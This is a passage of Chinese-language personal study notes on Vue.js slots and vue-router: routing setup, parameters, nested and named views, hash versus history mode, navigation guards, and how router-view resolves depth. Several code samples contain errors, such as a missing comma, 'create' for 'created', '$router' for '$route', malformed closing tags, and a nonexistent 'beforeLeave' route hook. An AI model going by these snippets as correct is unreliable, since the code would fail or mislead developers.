但是插槽显示的位置却由子组件自身决定，slot写在组件template的什么位置，父组件传过来的模板将来就显示在什么位置 \n实际上，一个slot最核心的两个问题在这里就点出来了，是显示不显示和怎样显示。\n\n## 单个插槽 \n首先是单个插槽，单个插槽是vue的官方叫法，但是其实也可以叫它默认插槽，或者与具名插槽相对，我们可以叫它匿名插槽。因为它不用设置name属性。\n单个插槽可以放置在组件的任意位置，但是就像它的名字一样，一个组件中只能有一个该类插槽。相对应的，具名插槽就可以有很多个，只要名字（name属性）不同就可以了。\n下面通过一个例子来展示。\n父组件：\n```html\n<template>\n    <div class=\"father\">\n        <h3>这里是父组件</h3>\n        <child>\n            <div class=\"tmpl\">\n              <span>菜单1</span>\n              <span>菜单2</span>\n              <span>菜单3</span>\n              <span>菜单4</span>\n              <span>菜单5</span>\n              <span>菜单6</span>\n            </div>\n        </child>\n    </div>\n</template>\n```\n子组件：\n```html\n<template>\n    <div>\n        <h3>这里是子组件</h3>\n        <slot></slot>\n    </div>\n</template>\n```\n在这个例子里，因为父组件在里面写了html模板，那么子组件的匿名插槽这块模板就是下面这样。也就是说，子组件的匿名插槽被使用了，是被下面这块模板使用了。\n```html\n<div class=\"tmpl\">\n  <span>菜单1</span>\n  <span>菜单2</span>\n  <span>菜单3</span>\n  <span>菜单4</span>\n  <span>菜单5</span>\n  <span>菜单6</span>\n</div>\n```\n最终的渲染结果如图所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409120546.png)\n\n## 具名插槽\n匿名插槽没有name属性，所以是匿名插槽，那么，插槽加了name属性，就变成了具名插槽。具名插槽可以在一个组件中出现N次，出现在不同的位置。下面的例子，就是一个有两个具名插槽和单个插槽的组件，这三个插槽被父组件用同一套css样式显示了出来，不同的是内容上略有区别。\n父组件：\n```html\n<template>\n  <div class=\"father\">\n    <h3>这里是父组件</h3>\n    <child>\n      <div class=\"tmpl\" slot=\"up\">\n        <span>菜单1</span>\n        <span>菜单2</span>\n        <span>菜单3</span>\n        <span>菜单4</span>\n        <span>菜单5</span>\n        <span>菜单6</span>\n      </div>\n      <div class=\"tmpl\" slot=\"down\">\n        <span>菜单-1</span>\n        <span>菜单-2</span>\n        <span>菜单-3</span>\n        <span>菜单-4</span>\n        <span>菜单-5</span>\n        <span>菜单-6</span>\n      </div>\n      <div class=\"tmpl\">\n        <span>菜单->1</span>\n        <span>菜单->2</span>\n        <span>菜单->3</span>\n        <span>菜单->4</span>\n        <span>菜单->5</span>\n        <span>菜单->6</span>\n      </div>\n    </child>\n  </div>\n</template>\n```\n子组件：\n```html\n<template>\n  <div>\n    // 具名插槽\n    <slot name=\"up\"></slot>\n    <h3>这里是子组件</h3>\n    // 具名插槽\n    <slot name=\"down\"></slot>\n    // 匿名插槽\n    <slot></slot>\n  </div>\n</template>\n```\n显示结果如图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409120558.png)\n\n可以看到，父组件通过html模板上的slot属性关联具名插槽。没有slot属性的html模板默认关联匿名插槽。\n\n## slot-scope/作用域插槽/带数据的插槽\n最后，就是我们的作用域插槽。这个稍微难理解一点。官方叫它作用域插槽，实际上，对比前面两种插槽，我们可以叫它带数据的插槽。什么意思呢，就是前面两种，都是在组件的template里面写\n```html\n//匿名插槽\n<slot></slot>\n\n//具名插槽\n<slot name=\"up\"></slot>\n```\n\n但是作用域插槽要求，在slot上面绑定数据。也就是你得写成大概下面这个样子。\n```html\n<slot name=\"up\" :data=\"data\"></slot>\n export default {\n    data: function(){\n      return {\n        data: ['zhangsan','lisi','wanwu','zhaoliu','tianqi','xiaoba']\n      }\n    },\n}\n```\n我们前面说了，插槽最后显示不显示是看父组件有没有在child下面写模板，像下面那样。\n```html\n<child>\n   html模板\n</child>\n```\n写了，插槽就总得在浏览器上显示点东西，东西就是html该有的模样，没写，插槽就是空壳子，啥都没有。\nOK，我们说有html模板的情况，就是父组件会往子组件插模板的情况，那到底插一套什么样的样式呢，这由父组件的html+css共同决定，但是这套样式里面的内容呢？\n正因为作用域插槽绑定了一套数据，父组件可以拿来用。于是，情况就变成了这样：样式父组件说了算，但内容可以显示子组件插槽绑定的。\n我们再来对比，作用域插槽跟单个插槽和具名插槽的区别，因为单个插槽和具名插槽不绑定数据，所以父组件提供的模板一般要既包括样式又包括内容，上面的例子中，你看到的文字，“菜单1”，“菜单2”都是父组件自己提供的内容；而作用域插槽，父组件只需要提供一套样式（在确实用作用域插槽绑定的数据的前提下）。\n下面的例子，你就能看到，父组件提供了三种样式(分别是flex、ul、直接显示)，都没有提供数据，数据使用的都是子组件插槽自己绑定的那个数组（一堆人名的那个数组）。\n\n父组件：\n```html\n<template>\n  <div class=\"father\">\n    <h3>这里是父组件</h3>\n    <!--第一次使用：用flex展示数据-->\n    <child>\n      <template slot-scope=\"user\">\n        <div class=\"tmpl\">\n          <span v-for=\"item in user.data\">{{item}}</span>\n        </div>\n      </template>\n\n    </child>\n\n    <!--第二次使用：用列表展示数据-->\n    <child>\n      <template slot-scope=\"user\">\n        <ul>\n          <li v-for=\"item in user.data\">{{item}}</li>\n        </ul>\n      </template>\n\n    </child>\n\n    <!--第三次使用：直接显示数据-->\n    <child>\n      <template slot-scope=\"user\">\n       {{user.data}}\n      </template>\n\n    </child>\n\n    <!--第四次使用：不使用其提供的数据, 作用域插槽退变成匿名插槽-->\n    <child>\n      我就是模板\n    </child>\n  </div>\n</template>\n```\n子组件：\n```html\n<template>\n  <div class=\"child\">\n\n    <h3>这里是子组件</h3>\n    // 作用域插槽\n    <slot  :data=\"data\"></slot>\n  </div>\n</template>\n\n export default {\n    data: function(){\n      return {\n        data: ['zhangsan','lisi','wanwu','zhaoliu','tianqi','xiaoba']\n      }\n    }\n}\n```\n结果如图所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409121709.png)\n\n\n# 路由\n1. 后端路由：对于普通的网站，所有的超链接都是URL地址，所有的URL地址都对应服务器上对应的资源；\n2. 前端路由：对于单页面应用程序来说，主要通过URL中的hash(#号)来实现不同页面之间的切换，同时，hash有一个特点：HTTP请求中不会包含hash相关的内容；所以，单页面程序中的页面跳转主要用hash实现；\n3. 在单页面应用程序中，这种通过hash改变来切换页面的方式，称作前端路由（区别于后端路由）；\n\n* 后端路由: 输入url -》请求发送到服务器 -》服务器解析请求的路径 -〉拿到对应的页面 -》 返回回去\n* 前端路由: 输入url -〉js解析地址 -》找到对应的地址页面 -〉执行页面生产的js -》 看到页面\n\n\n## vue-router\n1. 导入 vue-router 组件类库：\n```html\n<!-- 1. 导入 vue-router 组件类库 -->\n<script src=\"./lib/vue-router-2.7.0.js\"></script>\n```\n\n2. 使用 router-link 组件来导航\n```html\n<!-- 使用 router-link 组件来导航，router-link默认渲染为一个a标签，可以通过tag属性来改变-->\n<router-link to=\"/login\" tag=\"span\">登录</router-link>\n<router-link to=\"/register\">注册</router-link>\n\n<!-- 或者 使用 a标签 组件来导航 -->\n<a href=\"#/login\">登录</a>\n<a href=\"#/register\">注册</a>\n```\n\n3. 使用`router-view`组件来显示匹配到的组件\n```html\n<!-- 3. 使用`router-view`组件来显示匹配到的组件 -->\n<!-- 这是 vue-router 提供的元素，专门用来当作占位符的，将来路由规则匹配到的组件，就会展示到这个router-view中去  -->\n<router-view></router-view>\n```\n\n4. 创建使用`Vue.extend`创建组件\n```js\n// 4.1 使用 Vue.extend 来创建登录组件\nvar login = Vue.extend({\n    template: '<h1>登录组件</h1>'\n});\n// 4.2 使用 Vue.extend 来创建注册组件\nvar register = Vue.extend({\n    template: '<h1>注册组件</h1>'\n});\n\n// 4.2 使用 Vue.extend 来创建注册组件\nvar error = Vue.extend({\n    template: '<h1>找不到页面</h1>'\n});\n```\n\n5. 创建一个路由 router 实例，通过 routers 属性来定义路由匹配规则\n```js\n// 5. 创建一个路由router实例，通过 routers 属性来定义路由匹配规则\nvar router = new VueRouter({\n    routes: [\n        // path：表示监听哪个前端路由链接地址\n        //component的属性值必需要是一个组件对象，而不能是组件的引用名称\n        //redirect表示重定向另一个前端路由链接地址\n        { path: '/', redirect: '/login' }, \n        { path: '/login', component: login },\n        { path: '/register', component: register }\n        { path: '*', component: error} //找不到页面时的配置, 会使用error组件\n    ]\n});\n```\n\n6. 使用 router 属性来使用路由规则\n```js\n// 6. 创建 Vue 实例，得到 ViewModel\nvar vm = new Vue({\n    el: '#app',\n    router: router // 将路由规则对象注册到vm实例上，用来监听url地址的变化，然后展示对应的组件\n});\n```\n\n**注：当一个组件要用于路由匹配规则跳转时，不能使用如下方式来创建组件**\n```\nVue.component(\"login\",{\n  template: '...'\n})\n```\n因为此时的login只是组件的引用名称，而不是一个组件对象。而routes属性中的component属性值必须要是一个组件对象，而不能使组件的引用名称， 所以如果按照上述的方式来创建组件，那么`{ path: '/login', component: login }`的写法是无法识别该组件的\n\n## 路由传参\n**第一种方式：query方法**\n```js\n{ path: '/login', component: login }\n```\n2. 通过 `this.$route.query`来获取路由中的参数：\n```js\n<router-link to=\"/login?id=10&name=whz\">login<router-link>\n\n<router-view><router-view>\n\nvar login = Vue.extend({\n    template: '<h1>注册组件 --- {{this.$route.query.id}}---{{this.$router.query.name}}</h1>',\n    create(){\n      console.log(this.$route.query)//在控制台输出query对象\n    }\n});\n```\n此时`/login?id=10&name=whz`的前端路由能够被匹配到，且展示相应的login组件\n\n**第二种方式：params方法**\n1. 在规则中定义参数：\n```js\n{ path: '/register/:id/:name', component: login }\n```\n2. 通过 `this.$route.params`来获取路由中的参数：\n```js\n<router-link to=\"/login/10/whz\">login<router-link>\n\n<router-view><router-view>\n\nvar login = Vue.extend({\n    template: '<h1>注册组件 --- {{this.$route.params.id}}---{{this.$route.params.name}}</h1>',\n    create(){\n      console.log(this.$route.params) //在控制台输出params对象\n    }\n});\n```\n\n## 路由嵌套\n实际生活中的应用界面，通常由多层嵌套的组件组合而成。同样地，URL 中各段动态路径也按某种结构对应嵌套的各层组件，例如：\n```\n/user/foo/profile                     /user/foo/posts\n+------------------+                  +-----------------+\n| User             |                  | User            |\n| +--------------+ |                  | +-------------+ |\n| | Profile      | |  +------------>  | | Posts       | |\n| |              | |                  | |             | |\n| +--------------+ |                  | +-------------+ |\n+------------------+                  +-----------------+\n```\n借助 vue-router的children属性，使用嵌套路由配置，就可以很简单地表达这种关系。\n```html\n<div id=\"app\">\n  <router-view></router-view>\n</div>\n```\n```js\nconst User = {\n  template: '<div>User {{ $route.params.id }}</div>'\n}\n\nconst router = new VueRouter({\n  routes: [{ path: '/user/:id', component: User }]\n})\n```\n这里的`<router-view>`是最顶层的出口，渲染最高级路由匹配到的组件。同样地，一个被渲染组件同样可以包含自己的嵌套 `<router-view>`。例如，在 User 组件的模板添加一个 `<router-view>`：\n\n```js\nconst User = {\n  template: `\n    <div class=\"user\">\n      <h2>User {{ $route.params.id }}</h2>\n      <router-view></router-view>\n    </div>\n  `\n}\n```\n要在嵌套的出口中渲染组件，需要在 VueRouter 的参数中使用 children 配置：\n```js\nconst router = new VueRouter({\n  routes: [\n    {\n      path: '/user/:id',\n      component: User,\n      children: [\n        {\n          // 当 /user/:id/profile 匹配成功，\n          // UserProfile 会被渲染在 User 的 <router-view> 中\n          path: 'profile',\n          component: UserProfile\n        },\n        {\n          // 当 /user/:id/posts 匹配成功\n          // UserPosts 会被渲染在 User 的 <router-view> 中\n          path: 'posts',\n          component: UserPosts\n        }\n      ]\n    }\n  ]\n})\n```\n要注意，以 / 开头的嵌套路径会被当作根路径。 这让你充分的使用嵌套组件而无须设置嵌套的路径。\n\n此时，基于上面的配置，当你访问 /user/foo 时，User 的出口是不会渲染任何东西，这是因为没有匹配到合适的子路由。如果你想要渲染点什么，可以提供一个 空的 子路由：\n```js\nconst router = new VueRouter({\n  routes: [\n    {\n      path: '/user/:id',\n      component: User,\n      children: [\n        // 当 /user/:id 匹配成功，\n        // UserHome 会被渲染在 User 的 <router-view> 中\n        { path: '', component: UserHome }\n\n        // ...其他子路由\n      ]\n    }\n  ]\n})\n```\n\n## 动态生成路由\n利用 vue-router 的 addRoutes 方法可以动态添加路由。\n**router.addRoutes**\n```js\nrouter.addRoutes(routes: Array<RouteConfig>)\n```\n动态添加更多的路由规则。参数必须是一个符合 routes 选项要求的数组。\n\n举个例子：\n```js\nconst router = new Router({\n    routes: [\n        {\n            path: '/login',\n            name: 'login',\n            component: () => import('../components/Login.vue')\n        },\n        {path: '/', redirect: '/home'},\n    ]   \n})\n```\n上面的代码和下面的代码效果是一样的\n```js\nconst router = new Router({\n    routes: [\n        {path: '/', redirect: '/home'},\n    ]   \n})\n\nrouter.addRoutes([\n    {\n        path: '/login',\n        name: 'login',\n        component: () => import('../components/Login.vue')\n    }\n])\n```\n\n**注：使用router.addRoutes动态添加路由后，router.options.routes是不会更新的。**\n解决方法：\n1. 在addroutes前，使用router.options.routes=XXXXX的方法手动添加\n2. 使用vue作者的方法，在vuex store里维护一个routes对象，然后使用这个对象遍历生成侧面导航栏\n\n## 命名视图\n一般情况下，一个页面里面可能有多个组件，比如侧边栏，内容区，侧边栏是一个组件、内容区是一个组件，我们普遍会将两个组件作为子组件添加到主页面中，因为页面中只有一个router-view视图，那么问题来了，怎么让一个页面中有多个视图呢，拥有多个视图，很随意，多写几个router-view标签就行了，但是每个router-view视图里面显示的相同的内容，这是一个问题，多写几个视图好像没什么用，那么怎么让一个页面中的多个视图显示不同的内容呢？\n下面就来介绍命名视图的作用，首先，一般情况下，我们在路由配置中，一个路由路径只能对应一个组件，若想对应多个组件，必须得作为子组件存在，然后再一个公用的视图内显示，这是一个路由对应多个组件，这些组件对应一个视图\n例如：\n```json\n{\n　　path:'tv',\n　　name:'tv',\n　　component:Tv,\n　　children:[\n　　　　{path:'',component:Zhonghe},\n　　　　{path:'zhonghe',component:Zhonghe},\n　　　　{path:'guochan',component:Guochan},\n　　　　{path:'yingmei',component:Yingmei},\n　　　　{path:'riju',component:Riju},\n　　　　{path:'hanju',component:Hanju}\n　　]\n},\n```\n那么，下面来介绍命名视图：有时候想同时 (同级) 展示多个视图，而不是嵌套展示，例如创建一个布局，有 sidebar (侧导航) 和 main (主内容) 两个视图，这个时候命名视图就派上用场了。你可以在界面中拥有多个单独命名的视图，而不是只有一个单独的出口。如果 router-view 没有设置名字，那么默认为 default。\n```js\n<router-view></router-view>\n<router-view name=\"a\"></router-view>\n<router-view name=\"b\"></router-view>\n```\n一个视图使用一个组件渲染，因此对于同个路由，多个视图就需要多个组件。确保正确使用 components配置 (带上 s)：\n```js\nconst router = new VueRouter({\n  routes: [\n    {\n      path: '/',\n      components: {\n        default: Foo,\n        a: Bar,\n        b: Baz\n      }\n    }\n  ]\n})\n```\n解释一下：\n在这个默认路由下，\n第一个非未命名视图显示Foo组件\n第二个name名为a的视图显示Bar组件\n第二个name名为b的视图显示Baz组件\n\n## 设置路由切换动效\n示例：\n```html\n  <style>\n    .router-link-active,\n    .myactive {\n      color: red;\n      font-weight: 800;\n      font-style: italic;\n      font-size: 80px;\n      text-decoration: underline;\n      background-color: green;\n    }\n\n    .v-enter,\n    .v-leave-to {\n      opacity: 0;\n      transform: translateX(140px);\n    }\n\n    .v-enter-active,\n    .v-leave-active {\n      transition: all 0.5s ease;\n    }\n  </style>\n</head>\n\n<body>\n  <div id=\"app\">\n\n    <!-- <a href=\"#/login\">登录</a> -->\n    <!-- <a href=\"#/register\">注册</a> -->\n\n    <!-- router-link 默认渲染为一个a 标签 -->\n    <router-link to=\"/login\" tag=\"span\">登录</router-link>\n    <router-link to=\"/register\">注册</router-link>\n\n    <!-- 这是 vue-router 提供的元素，专门用来 当作占位符的，将来，路由规则，匹配到的组件，就会展示到这个 router-view 中去 -->\n    <!-- 所以： 我们可以把 router-view 认为是一个占位符 -->\n    <transition mode=\"out-in\">\n      <router-view></router-view>\n    </transition>\n  </div>\n\n  <script>\n    // 组件的模板对象\n    var login = {\n      template: '<h1>登录组件</h1>'\n    }\n\n    var register = {\n      template: '<h1>注册组件</h1>'\n    }\n\n\n    /*  Vue.component('login', {\n       template: '<h1>登录组件</h1>'\n     }) */\n\n    // 2. 创建一个路由对象， 当 导入 vue-router 包之后，在 window 全局对象中，就有了一个 路由的构造函数，叫做 VueRouter\n    // 在 new 路由对象的时候，可以为 构造函数，传递一个配置对象\n    var routerObj = new VueRouter({\n      // route // 这个配置对象中的 route 表示 【路由匹配规则】 的意思\n      routes: [ // 路由匹配规则 \n        // 每个路由规则，都是一个对象，这个规则对象，身上，有两个必须的属性：\n        //  属性1 是 path， 表示监听 哪个路由链接地址；\n        //  属性2 是 component， 表示，如果 路由是前面匹配到的 path ，则展示 component 属性对应的那个组件\n        // 注意： component 的属性值，必须是一个 组件的模板对象， 不能是 组件的引用名称；\n        // { path: '/', component: login },\n        { path: '/', redirect: '/login' }, // 这里的 redirect 和 Node 中的 redirect 完全是两码事\n        { path: '/login', component: login },\n        { path: '/register', component: register }\n      ],\n      linkActiveClass: 'myactive'   //经路由选中时的样式类替换成myactive\n    })\n\n    // 创建 Vue 实例，得到 ViewModel\n    var vm = new Vue({\n      el: '#app',\n      data: {},\n      methods: {},\n      router: routerObj // 将路由规则对象，注册到 vm 实例上，用来监听 URL 地址的变化，然后展示对应的组件\n    });\n  </script>\n</body>\n```\n\n## vue-router的两种模式\nvue-router中提供两种模式，分别是hash模式与history模式。\nvur-router默认是使用hash模式，我们可以通过在VueRouter的构造函数中添加`mode:'history'`代码来使用history模式，如下：\n```js\nvar router = new VueRouter({\n  mode: 'history',\n  routes:[\n    ...\n  ]\n})\n```\n\n**为什么要有 hash 和 history**\n\n详情请见计算机网络.md\n\n对于 Vue 这类渐进式前端开发框架，为了构建 SPA（单页面应用），需要引入前端路由系统，这也就是 Vue-Router 存在的意义。前端路由的核心，就在于改变视图的同时不会向后端发出请求。\n\n为了达到这一目的，浏览器当前提供了以下两种支持：\n- hash模式：即地址栏 URL 中的 # 符号（此 hash 不是密码学里的散列运算）。比如这个 URL：http://www.abc.com/#/hello，hash 的值为 #/hello。它的特点在于：hash 虽然出现在 URL 中，但不会被包括在 HTTP 请求中，对后端完全没有影响，因此改变 hash 不会重新加载页面。\n- history：利用了 HTML5 History Interface 中新增的 pushState() 和 replaceState() 方法。（需要特定浏览器支持）这两个方法应用于浏览器的历史记录栈，在当前已有的 back、forward、go 的基础之上，它们提供了对历史记录进行修改的功能。只是当它们执行修改时，**虽然改变了当前的 URL，但浏览器不会立即向后端发送请求**。\n \n因此可以说，hash 模式和 history 模式都属于浏览器自身的特性，Vue-Router 只是利用了这两个特性（通过调用浏览器提供的接口）来实现前端路由。\n\n### 使用场景\n一般场景下，hash 和 history 都可以，除非你更在意颜值，# 符号夹杂在 URL 里看起来确实有些不太美丽。\n\n>如果不想要很丑的 hash，我们可以用路由的 history 模式，这种模式充分利用 history.pushState API 来完成URL 跳转而无须重新加载页面。—— Vue-router 官网。\n\n另外，根据 Mozilla Develop Network 的介绍，调用 history.pushState() 相比于直接修改 hash，存在以下优势：\n- pushState() 设置的新 URL 可以是与当前 URL 同源的任意 URL；而 hash 只可修改 # 后面的部分，因此只能设置与当前 URL 同文档的 URL；\n- pushState() 设置的新 URL 可以与当前 URL 一模一样，这样也会把记录添加到栈中；而 hash 设置的新值必须与原来不一样才会触发动作将记录添加到栈中；\n- pushState() 通过 stateObject 参数可以添加任意类型的数据到记录中；而 hash 只可添加短字符串；\n- pushState() 可额外设置 title 属性供后续使用。\n\n当然啦，history 也不是样样都好。SPA 虽然在浏览器里游刃有余，但真要通过 URL 向后端发起 HTTP 请求时，两者的差异就来了。尤其在用户手动输入 URL 后回车，或者刷新（重启）浏览器的时候。\n- hash 模式下，仅 hash 符号之前的内容会被包含在请求中，如 http://www.abc.com，因此对于后端来说，即使没有做到对路由的全覆盖，也不会返回 404 错误。\n- history 模式下，前端的 URL 必须和实际向后端发起请求的 URL 一致，如 http://www.abc.com/book/id。如果后端缺少对 /book/id 的路由处理，将返回 404 错误。Vue-Router 官网里如此描述：“不过这种模式要玩好，还需要后台配置支持……所以呢，你要在服务端增加一个覆盖所有情况的候选资源：如果 URL 匹配不到任何静态资源，则应该返回同一个 index.html 页面，这个页面就是你 app 依赖的页面。”\n\n## 路由中的钩子函数（导航守卫）\n总体来讲vue路由里面提供了三大类钩子(守卫)\n1. 全局钩子\n2. 某个路由独享的钩子\n3. 组件内钩子\n\n### 全局钩子函数\n```js\nrouter.beforeEach((to, from, next) => {\n  /* must call `next` */\n})\n\nrouter.afterEach((to, from) => {})\n```\n\n当一个导航触发时，全局前置守卫按照创建顺序调用\n每个守卫方法接收三个参数：\n1. `to`: (route路由对象)  表示即将要进入的目标的路由对象，to对象下面的属性： path、params、query、hash、fullPath、matched、name、meta（在matched下，但是本例可以直接用）\n2. `from`: (route路由对象)  表示当前导航正要离开的路由对象\n3. `next`: (Function函数)   一定要调用该方法来 resolve 这个钩子。  调用方法：next(参数或者空)   必须调用\n  - next(): 进行管道中的下一个钩子。如果全部钩子执行完了，则导航的状态就是 confirmed (确认的)。\n  - next(false): 中断当前的导航。如果浏览器的 URL 改变了 (可能是用户手动或者浏览器后退按钮)，那么 URL 地址会重置到 from 路由对应的地址。\n  - next('/') 或者 next({ path: '/' }): 跳转到一个不同的地址。当前的导航被中断，然后进行一个新的导航。你可以向 next 传递任意位置对象，且允许设置诸如 replace: true、name: 'home' 之类的选项以及任何用在 router-link 的 to prop 或 router.push 中的选项。\n  - next(error): (2.4.0+) 如果传入 next 的参数是一个 Error 实例，则导航会被终止且该错误会被传递给 router.onError() 注册过的回调。\n\n### 某个路由独享的钩子\n就像说的一样，给某个路由单独使用的，本质上和后面的组件内钩子是一样的。都是特指的某个路由。不同的是，这里的一般定义在router当中，而不是在组件内。如下\n```js\nconst router = new VueRouter({\n  routes: [\n    {\n      path: '/foo',\n      component: Foo,\n      beforeEnter: (to, from, next) => {\n        // ...\n      },\n      beforeLeave: (to, from, next) => {\n        // ...\n      }\n    }\n  ]\n})\n```\n### 组件内钩子\n你可以在路由组件内直接定义以下路由导航钩子： 如下\n```js\nexport default{\n  name:'test',\n  data() {},\n  beforeRouteEnter (to, from, next) {\n    // 在渲染该组件的对应路由被 confirm 前调用\n    // 不能获取组件实例 `this`\n    // 因为当钩子执行前，组件实例还没被创建\n  },\n  beforeRouteUpdate (to, from, next) {\n    // 在当前路由改变，但是该组件被复用时调用\n    // 举例来说，对于一个带有动态参数的路径 /foo/:id，在 /foo/1 和 /foo/2 之间跳转的时候，\n    // 由于会渲染同样的 Foo 组件，因此组件实例会被复用。而这个钩子就会在这个情况下被调用。\n    // 可以访问组件实例 `this`\n  },\n  beforeRouteLeave (to, from, next) {\n    // 导航离开该组件的对应路由时调用\n    // 可以访问组件实例 `this`\n  }\n}\n```\n注意：beforeRouteEnter钩子不能访问this，因为钩子在导航确认前被调用，因此即将登场的新组件还没被创建。\n\n不过，你可以通过传一个回调给next来访问组件实例。在导航被确认的时候执行回调，并且把组件实例作为回调方法的参数。\n```js\nbeforeRouteEnter (to, from, next) {\n  next(vm => {\n    // 通过 `vm` 访问组件实例\n  })\n}\n```\n你可以 在 beforeRouteLeave中直接访问this。这个leave钩子通常用来禁止用户在还未保存修改前突然离开。可以通过next(false)来取消导航。\n同时注意必须有这个next()，相当于一个按钮开启一样。\n\n## 区分route对象与router对象\n`this.$route`是路由参数对象，所有路由中的参数，其中包含params, query都属于它\n`this.$router`是路由导航对象， 用它可以方便的使用JS代码来实现路由的前进、后退、跳转到行的URL 地址\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409121736.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409121751.png)\n\n## vue-router原理解析\n我们在页面中使用vue-router一般是这样的：\n```html\n    <!--这是App.vue组件-->\n    <div>\n        <div>\n            <!--这里放导航-->\n            <router-link to=\"/home\">home</router-link>\n            <router-link to=\"/about\">about</router-link>\n        </div>\n        \n        <!--这里是导航对应的组件要渲染的地方-->\n        <router-view></router-view>\n    </div>\n```\n当我们点击home导航，`<router-view></router-view>`里就会展示home组件对应的内容\n当我们点击about导航，`<router-view></router-view>`里就会展示about组件对应的内容\n\n### 基本原理\n```html\n<router-link to=\"/home\">home</router-link>\n<router-link to=\"/about\">about</router-link>\n```\n会被解析为\n```html\n<a href=\"#/home\">home</a>\n<a href=\"#/about\">about</a>\n```\n当我们点击`<a href=\"#/home\">home</a>`时，页面链接的hash就变成了#/home，这会触发hashchange事件，我们通过监听hashchange事件，可以拿到当前页面的hash变为了#/home，然后可以通过/home拿到其对应的组件，再将组件放到`<router-view></router-view>`组件里渲染出来就可以了。\n\n如何通过/home拿到对应的组件呢，因为我们创建router实例的时候会先创建一个类似下面routes的路由配置对象，通过该对象可以拿到当前路由对应的组件。\n```js\nconst routes = [\n    { path: '/home', component: Home },\n    { path: '/about', component: About }\n  ]\n```\n以上就是从路由变化到路由跳转的一个基本过程。\n\n### 路由嵌套原理\n我们在写路由的时候有时候会写嵌套路由，配置对象类似下面这样，我们在/about路由下添加了children属性，保存其子路由：\n```js\nimport Home from './components/Home';\nimport About from './components/About';\nimport RouterLearn from './components/RouterLearn';\n\nconst routes = [\n    { path: '/home', component: Home },\n    { \n        path: '/about',\n        component: About, \n        // 子路由\n        children: [\n            {\n                path: 'routerLearn',\n                component: RouterLearn\n            }\n        ]\n    }\n  ]\n```\n单文件组件里面会这么引用：\nApp.vue组件\n```html\n<template>\n    <div>\n        <p>这是App组件</p>\n        <div>\n            <router-link to=\"/home\">home</router-link>\n            <router-link to=\"/about/routerLearn\">about/routerLearn</router-link>\n        </div>\n        <router-view></router-view>\n    </div>\n</template>\n```\nAbout组件\n```html\n<template>\n    <div>\n        这是about组件\n        <router-view></router-view>\n    </div>\n</template>\n```\n当我们点击`<router-link to=\"/about/routerLearn\">routerLearn</router-link>`导航时，页面的hash会变成#/about/routerLearn，所以这个时候要实现的是App.vue组件里的`<router-view></router-view>`渲染的是About组件，About组件里的`<router-view></router-view>`里面渲染的是routerLearn组件。\n\n**关键是如何让`<router-view></router-view>`知道自己该渲染的是哪个组件呢，实现方法是：**\n1. 给每个router-view组件计算出自己的深度，最外层的router-view其深度为0，即index.html中的`<router-view>`，如果router-view渲染的组件里又有router-view，那么这个嵌套的router-view深度就是1，计算方法如下：\n```js\n vue.component('router-view', {\n        render(h) {\n        \n            // 如果是router-view组件，就在实例上设置一个标识\n            this.routerView = true;\n\n            // 获取当前router-view的深度,初始值为0\n            let depth = 0;\n            let parent = this.$parent; // 父组件实例\n            \n            // 向上递归查找父组件，如果找到depth就+1，最终计算出的depth即为该router-view的深度\n            while (parent) {\n               if (parent.routerView) depth++;\n                parent = parent.$parent;\n            }\n\n            // 根据当前router-view的深度，从匹配的路由中拿到对应的组件\n            let com = this.$router.matched[depth].component;\n\n            return h(com);\n        }\n    });\n```\n2. 根据路由配置对象以及当前页面的hash，计算出匹配当前页面hash的路由数组，计算方法如下：\n```js\n// 路由配置对象是这样的\nconst routes = [\n    { path: '/home', component: Home },\n    { \n        path: '/about',\n        component: About, \n        // 子路由\n        children: [\n            {\n                path: 'routerLearn',\n                component: RouterLearn\n            }\n        ]\n    }\n  ]\n  \n  // 当前的页面hash为 #/about/routerLearn\n  let current = '#/about/routerLearn';\n  \n  // 得到当前hash匹配的路由数组metched\n  // 这里matched会得到 [About路由配置对象， RouterLearn路由配置对象]\n  let matched = match(routes);\n\n    // 递归遍历routes，获取当前hash匹配的路由\n    function match(routes) {\n        for (const route of routes) {\n            if (this.current.indexOf(route.path) !== -1) {\n                this.matched.push(route);\n                if (route.children) {\n                    this.match(route.children);\n                }\n            }\n        }\n    }\n```\n3. 计算出router-view的深度，以及拿到matched数组后，就能知道每个router-view该渲染哪个组件了，需要渲染的组件为`matched[depth].component`, **并且会渲染得到的matched数组中所有的组件到相应的`<router-view/>`中**，因为子组件的`<router-view>`不能脱离其父组件而存在， 其证明见下：\n\n假设此我的路由配置如下：\n```js\nimport Test1 from './views/Test1.vue'\nimport Test2 from './views/Test2.vue'\nimport Test3 from './views/Test3.vue'\n\nvar router = new VueRouter({\n  routes:[\n    {path:'/home', component: Home, children:[\n      {path: '/test1', component: Test1},\n      {path: 'test2', component: Test1},\n    ]},\n    {path: '/test3', component: Test2},\n  ]\n})\n```\nTest1.vue\n```\n<template>\n  <div>Test1</div>\n</template>\n```\nTest2.vue\n```\n<template>\n  <div>Test2</div>\n</template>\n```\nTest3.vue\n```\n<template>\n  <div>Test3</div>\n</template>\n```\n- 此时如果我们在浏览器中输入localhost:3000/test3, 会出现下面情况：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409121802.png)\n\n- 输入localhost:3000/home/test2, 会出现下面情况：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409121812.png)\n\n可见同时渲染了Home组件\n\n- 输入localhost:3000/test1, 会出现下面情况：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409121822.png)\n\n可见同时也渲染了Home组件\n\n## Vue-router中keep-alive的理解\n### 什么是keep-alive\nkeep-alive用来缓存组件,避免多次加载相应的组件,减少性能消耗，简单一点来说就是从页面1链接到其他页面后回退到页面1不用在重新执行页面1的代码，只会从缓存中加载之前已经缓存的页面1，这样可以减少加载时间及性能消耗，提高用户体验性。\n### keep-alive的作用是什么\n通过设置了keep-alive，可以简单理解为从页面1跳转到页面2后，然后后退到页面1，只会加载缓存中之前已经渲染好的页面1，而不会再次重新加载页面1，及不会再触发页面一种的created等类似的钩子函数，除非自己重新刷新该页面1。\n\n\n### 什么时候用keep-alive\n如果需要频繁切换路由，这个时候就可以考虑用keep-alive了，来达到避免数据的重复请求的目的。\n\n### 怎么用keep-alive\n```html\n<keep-alive>\n    <router-view> 